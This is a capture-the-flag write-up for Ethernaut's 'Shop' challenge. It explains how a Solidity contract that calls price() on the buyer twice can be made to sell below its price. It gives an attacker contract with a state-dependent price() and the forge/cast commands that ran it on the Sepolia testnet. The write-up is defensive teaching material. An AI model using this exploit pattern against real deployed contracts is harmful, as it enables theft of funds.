# Ethernaut Challenge 21 — Shop

This challenge demonstrates how relying on external contract calls for logic can lead to unexpected behavior.

Instance address:

```
0xC96C9Bd099b74DB1E7b98e8d0A422D067f3ADE28
````

---

## 🎯 Goal

Buy the item for **less than the initial price (100)**.

---

## 🔍 Contract analysis

```solidity
function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
````

### Key observations

* The contract calls `price()` on `msg.sender`
* It calls it **twice**
* The result is assumed to be consistent

---

## 🧠 Vulnerability

The contract trusts an **external call**:

```solidity
_buyer.price()
```

But:

* `msg.sender` is a contract we control
* we can return **different values on each call**

### Execution flow

1. First call:

   ```solidity
   _buyer.price() >= price
   ```

   → must return ≥ 100

2. Then:

   ```solidity
   isSold = true;
   ```

3. Second call:

   ```solidity
   price = _buyer.price();
   ```

   → we can now return a **lower value**

---

## 💣 Attack strategy

Return:

* **high price** when `isSold == false`
* **low price** when `isSold == true`

This works because `isSold` changes between the two calls.

---

## 🧪 Attacker contract

To solve the challenge I have implemented the [ShopAttacker.sol](ShopAttacker.sol) contract.

```solidity
function price() external view override returns (uint256) {
    if (!i_shop.isSold()) {
        return i_shop.price() + 20; // pass the check
    } else {
        return i_shop.price() - 20; // lower the final price
    }
}
```

---

## 🚀 Exploit on Sepolia

Set the contract address:

```bash
SHOP_SEPOLIA=0xC96C9Bd099b74DB1E7b98e8d0A422D067f3ADE28
```

Deploy attacker:

```bash
forge create src/challenge-21-shop/ShopAttacker.sol:ShopAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $SHOP_SEPOLIA
```

```
ShopAttacker: 0xDC2DDde57B185EC608B17136B14C910B32582E91
```

Set variable:

```bash
SHOP_ATTACKER_SEPOLIA=0xDC2DDde57B185EC608B17136B14C910B32582E91
```

Execute attack:

```bash
cast send $SHOP_ATTACKER_SEPOLIA \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction:

```
0x3e73c6ff895f10915f8e6a43f192731822e6f11ba1687cd5b1642a56e6082fa7
```

---

## ✅ Verify result

```bash
cast call $SHOP_SEPOLIA \
    "price()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
80
```

The item was bought for less than the original price (100), so the challenge is completed.

---

## 🛡️ Security takeaway

This challenge highlights a common mistake:

* trusting external contract calls for critical logic
* assuming return values are consistent across calls

### Best practices

* avoid calling external contracts multiple times for the same value
* cache results in local variables
* follow checks-effects-interactions carefully

---

## ✅ Key insight

> External calls can return different values within the same transaction, breaking assumptions about consistency.






